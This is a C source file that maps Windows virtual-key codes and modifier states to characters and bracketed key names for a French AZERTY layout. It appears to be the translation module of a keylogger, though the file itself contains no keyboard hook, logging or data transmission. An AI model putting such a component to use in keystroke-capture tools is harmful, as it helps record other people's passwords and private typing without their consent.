#include <stdio.h>
#include <windows.h>

#include "key.h"

char *translate_key(DWORD vkCode)
{
    char *key = malloc(KEY_SIZE);
    memset(key, '\0', KEY_SIZE);

    if (vkCode > 64 && vkCode < 91)
    {
        if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLock()))
            vkCode += 32;
        char key_char = (char)vkCode;
        sprintf(key, "%c", key_char);
    }
    else if (vkCode >= 48 && vkCode <= 57)
        key = number(vkCode);
    else if (vkCode >= VK_LBUTTON && vkCode <= 7)
        key = "";
    else if (vkCode >= VK_NUMPAD0 && vkCode <= VK_DIVIDE)
        key = n_pad(vkCode);
    else if (vkCode >= VK_F1 && vkCode <= VK_F24)
        key = f_key(vkCode);
    else
        key = other(vkCode);
    return key;
}

char *number(DWORD vkCode)
{
    char *number[] = {
        "à", "&", "é", "\"", "'", "(", "-", "è", "_", "ç"};
    char *number_shifted[] = {
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"};

    char *number_algr[] = {
        "@", UK, "~", "#", "{", "[", "|", "`", "\\", "^"};

    if (isCapsLock() || isShiftLock())
        return number_shifted[vkCode - 48];
    if (isAltgrLock())
        return number_algr[vkCode - 48];
    else
        return number[vkCode - 48];
}

char *n_pad(DWORD vkCode)
{
    char *key[] = {
        "0", "1", "2", "3", "4", "5",
        "6", "7", "8", "9", "*", "+",
        "-", "-", ".", "/"};
    return key[vkCode - VK_NUMPAD0];
}

char *f_key(DWORD vkCode)
{
    char *key[] = {
        "[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]",
        "[F7]", "[F8]", "[F9]", "[F10]", "[F11]", "[F12]",
        "[F13]", "[F14]", "[F15]", "[F16]", "[F17]", "[F18]",
        "[F19]", "[F20]", "[F21]", "[F22]", "[F23]", "[F24]"};

    return key[vkCode - VK_F1];
}

char *other(DWORD vkCode)
{
    switch (vkCode)
    {
    case VK_BACK:
        return "[BACK]";
    case VK_TAB:
        return "[TAB]";
    case VK_CLEAR:
        return "[CLEAR]";
    case VK_RETURN:
        return "[RETURN]";
    case VK_SHIFT:
        return "[SHIFT]";
    case VK_CONTROL:
        return "[CONTROL]";
    case VK_MENU:
        return "[ALT]";
    case VK_PAUSE:
        return "[PAUSE]";
    case VK_CAPITAL:
        return "[CAPITAL]";
    case VK_ESCAPE:
        return "[ESCAPE]";
    case VK_SPACE:
        return "[SPACE]";
    case VK_PRIOR:
        return "[PRIOR]";
    case VK_NEXT:
        return "[NEXT]";
    case VK_END:
        return "[END]";
    case VK_HOME:
        return "[HOME]";
    case VK_LEFT:
        return "[LEFT]";
    case VK_UP:
        return "[UP]";
    case VK_RIGHT:
        return "[RIGHT]";
    case VK_DOWN:
        return "[DOWN]";
    case VK_SELECT:
        return "[SELECT]";
    case VK_PRINT:
        return "[PRINT]";
    case VK_EXECUTE:
        return "[EXE]";
    case VK_SNAPSHOT:
        return "[SNAPSHOT]";
    case VK_INSERT:
        return "[INSERT]";
    case VK_DELETE:
        return "[DEL]";
    case VK_HELP:
        return "[HELP]";
    case VK_LWIN:
        return "[WIN]";
    case VK_RWIN:
        return "[WIN]";
    case VK_APPS:
        return "[APPS]";
    case VK_SLEEP:
        return "[SLEEP]";

    case 0xBA:
        if (isCapsLock() ^ isShiftLock())
            return "£";
        else if (isAltgrLock())
            return "¤";
        return "$";
    case 0xBB:
        if (isCapsLock() ^ isShiftLock())
            return "+";
        else if (isAltgrLock())
            return "}";
        return "=";
    case 0xBC:
        if (isCapsLock() ^ isShiftLock())
            return "?";
        return ",";
    case 0xBE:
        if (isCapsLock() ^ isShiftLock())
            return ".";
        return ";";
    case 0xBF:
        if (isCapsLock() ^ isShiftLock())
            return "/";
        return ":";
    case 0xC0:
        if (isCapsLock() ^ isShiftLock())
            return "%";
        return "ù";
    case 0xDB:
        if (isCapsLock() ^ isShiftLock())
            return "°";
        else if (isAltgrLock())
            return "]";
        return ")";
    case 0xDC:
        if (isCapsLock() ^ isShiftLock())
            return "µ";
        return "*";
    case 0xDD:
        if (isCapsLock() ^ isShiftLock())
            return "¨";
        return "^";
    case 0xDF:
        if (isCapsLock() ^ isShiftLock())
            return "§";
        return "!";

    case VK_NUMLOCK:
        return "[NUM_LOCK]";
    case VK_LSHIFT:
        return "";
    case VK_RSHIFT:
        return "";
    case VK_LCONTROL:
        return "";
    case VK_RCONTROL:
        return "";
    case VK_LMENU:
        return "";
    case VK_RMENU:
        return "";
    default:
        return UK;
    }
}

const int isCapsLock(void)
{
    return (GetKeyState(VK_CAPITAL) & 0x0001);
}

const int isAltgrLock(void)
{
    return (GetKeyState(VK_RMENU) < 0 && GetKeyState(VK_LCONTROL) < 0);
}

const int isShiftLock(void)
{
    return GetKeyState(VK_SHIFT) < 0;
}